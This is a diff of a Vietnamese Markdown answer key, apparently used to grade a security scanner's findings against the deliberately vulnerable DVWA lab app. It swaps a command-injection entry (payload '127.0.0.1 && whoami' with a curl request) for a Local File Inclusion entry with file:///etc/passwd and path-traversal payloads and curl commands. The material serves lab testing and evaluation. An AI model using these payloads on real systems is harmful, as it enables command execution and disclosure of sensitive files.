@@ -11,43 +11,60 @@ Tài liệu này đóng vai trò là **"bảng đáp án"** để đánh giá:
 
 - **Độ sâu (Depth):** Khả năng vượt qua (*bypass*) các cơ chế phòng vệ (*filter*) cơ bản và nâng cao của công cụ.
 
-# Command Injection - OWSAP Injection
-## Security level: low
-### Method 
+# Lỗ hổng: Local File Inclusion (LFI) - (OWASP A03:2021 - Injection)
+## Phương pháp
+Phân tích mã nguồn cho thấy một cơ chế `Whitelist (fnmatch("file*", ... ))` đã được triển khai nhưng bị lỗi, cho phép dữ liệu do người dùng include file tuỳ ý.
 
--   Phân tích mã nguồn cho thấy `parameter` 'ip' được truyền trực tiếp vào `shell_exec()` mà không qua bất kỳ bộ lọc nào.
+## Phân tích Dòng mã Lỗi (Vulnerable Code Line)
+Lỗ hổng xảy ra do luồng dữ liệu không an toàn từ "Untrusted data" đến hàm gọi nguy hiểm
 
-### Mã nguồn gây lỗi (Vulnerable Code):
-
+1. Nguồn (Source) - Nơi nhận dữ liệu không tin cậy:
+------------------------------------------------------
+* Vị trí: vulnerabilities/fi/index.php
+* Code:
 ```
-$cmd = shell_exec( 'ping  -c 4 ' . $target );
+    $file = $_GET[ 'page' ];
 ```
-### Các bước khai thác (Proof of Concept):
+* Mô tả: Biến `$file` nhận giá trị trực tiếp từ tham số 'page' của người dùng.
 
-- **Payload:**  
+2. Nơi xử lý (Sink) - Nơi thực thi hàm nguy hiểm:
+------------------------------------------------------
+* Vị trí: vulnerabilities/fi/index.php
+* Code:
+```
+    include( $file );
+```
+* Mô tả: Biến `$file` (hiện đang chứa payload) được truyền thẳng vào hàm include(). Hàm này sẽ thực thi hoặc hiển thị bất kỳ file nào được chỉ định, dẫn đến LFI.
+
+## Kịch bản Khai thác (Proof of Concept - PoC)
+
+### Kịch bản 1: Đọc tệp tin hệ thống qua PHP Wrapper
+* Tác động: Lộ lọt dữ liệu nhạy cảm.
+* Payload: 
+```
+file:///etc/passwd
+```
+* Ví dụ (cURL):
 ```bash
-127.0.0.1 && whoami
+    curl -G 'http://[DVWA_IP]/vulnerabilities/fi/' \
+         -b 'security=high; PHPSESSID=[YOUR_SESSION_ID]' \
+         --data-urlencode 'page=file:///etc/passwd'
 ```
+* Kết quả: *Response* trả về sẽ chứa dữ liệu của **/etc/passwd**
 
-- **Lệnh `curl`:**  
+### Kịch bản 2: Đọc tệp tin hệ thống qua Path Traversal
+* Tác động: Lộ lọt dữ liệu nhạy cảm.
+* Payload: 
+```
+file/../../../../../../etc/passwd
+```
+* Ví dụ (cURL):
 ```bash
-curl -X POST 'http://[DVWA_IP]/vulnerabilities/exec/' \
-     -b 'security=low; PHPSESSID=[YOUR_SESSION_ID]' \
-     -d 'ip=127.0.0.1 && whoami&submit=Submit'
+    curl -G 'http://[DVWA_IP]/vulnerabilities/fi/' \
+         -b 'security=high; PHPSESSID=[YOUR_SESSION_ID]' \
+         --data-urlencode 'page=file/../../../../../../etc/passwd'
 ```
+* Kết quả: *Response* trả về sẽ chứa dữ liệu của **/etc/passwd**
 
-- **Kết quả mong đợi:**  
-Trang web trả về kết quả của lệnh `whoami` (ví dụ: `www-data`).
 ### Screenshots
-
-<img width="2559" height="1335" alt="image" src="https://github.com/user-attachments/assets/b001397c-d73f-40af-a211-0b7a1e1088c1" />
-
-## Security level: Medium
-### Method 
-### Mã nguồn gây lỗi (Vulnerable Code)
-### Các bước khai thác (Proof of Concept)
-### Screenshots
-### Mô tả
-
-
-
+(Dán ảnh chụp màn hình của bạn vào đây)
